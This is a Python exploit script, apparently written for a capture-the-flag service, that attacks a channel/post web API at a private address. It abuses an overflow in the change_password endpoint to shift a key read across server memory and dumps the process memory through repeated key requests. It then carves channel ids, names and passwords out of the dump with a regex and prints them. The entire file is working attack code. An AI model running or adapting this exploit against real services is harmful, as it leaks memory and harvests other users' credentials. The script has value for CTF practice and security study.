import requests
import struct
from pathlib import Path
import string
import random
import sys
import re

SERVICE_URL = "http://10.60.27.1:4243/api/"

PASSWORD = "1234567890123456"
ADD_COUNT = 200
KEY_SIZE = 128

def add_channel(name, password, sess):
	response = sess.post(SERVICE_URL + "add_channel", { "name": name, "password": password })
	if response.status_code != 201:
		print("add_channel failed:", response.status_code)
		return False
	return response.text.split(':')[1]

def add_post(channel_id, password, text, sess):
	response = sess.post(SERVICE_URL + "add_post?channel_id={}".format(channel_id), { "password": password, "text": text })
	if response.status_code != 201:
		print("add_post failed:", response.status_code)
		return False
	return True

def get_key(channel_id, password, sess):
	response = sess.post(SERVICE_URL + "key?channel_id={}".format(channel_id), data={ "password": password })
	if response.status_code != 200:
		print("get_key failed", response.status_code)
		return False
	return response.content

def change_password(channel_id, password, new_password, sess):
	result = True
	try:
		response = sess.post(SERVICE_URL + "change_password?channel_id={}".format(channel_id), { "password": password, "new_password": new_password })
	except Exception:
		result = False
	rsult = result and response.status_code == 200
	if not result:
		print("change_password({}, {}, {}) failed:".format(channel_id, repr(password), repr(new_password)), response.status_code)
	return True

def dump(channel_id, low, high, sess):
	data = b""
	for addr_end in range(low, high, KEY_SIZE):
		print("\r", addr_end, end="")
		addr_end_b = struct.pack("<i", addr_end)
		last_significant_byte = [idx for idx, val in enumerate(addr_end_b) if val][-1]
		overflow = addr_end_b[:last_significant_byte+1]
		if change_password(channel_id, PASSWORD, PASSWORD.encode() + overflow, sess):
			key = get_key(channel_id, PASSWORD, sess)
			if key:
				data += key
	return data

def main():
	sess = requests.session()
	if len(sys.argv) > 1:
		if sys.argv[1] == "add":
			print("Adding {} channels:".format(ADD_COUNT))
			for i in range(ADD_COUNT):
				print("\r", i, end="")
				pw = "passw_{}".format(i)
				cid = add_channel("channel_{}_{}".format(i, hex(i)), pw, sess)
				add_post(cid, pw, "".join(random.choice(string.ascii_letters) for _ in range(32)), sess)

	cid = add_channel("channel", PASSWORD[:-1], sess)
	if cid and change_password(cid, PASSWORD[:-1], PASSWORD, sess):
		print("\nAdded channel {} using for dump".format(cid))
	else:
		return
	print("Dumping:")
	
	mem = dump(cid, 1, 65535, sess)
	print("\n")

	found = re.findall(b'.{4}[\w\-\_]{5}[\w\-\_\x00]{15}[\w\-\_]{5}[\w\-\_\x00]{11}', mem, re.DOTALL)
	channels = [struct.unpack("<i20s16s", channel_bytes) for channel_bytes in found]
	
	for channel in sorted(channels, key=lambda channel: channel[0]):
		print("Channel id: {}, Name: {}, Password: {}".format(*channel))

	Path("dump.txt").write_bytes(mem)
	

if __name__ == '__main__':
	main()
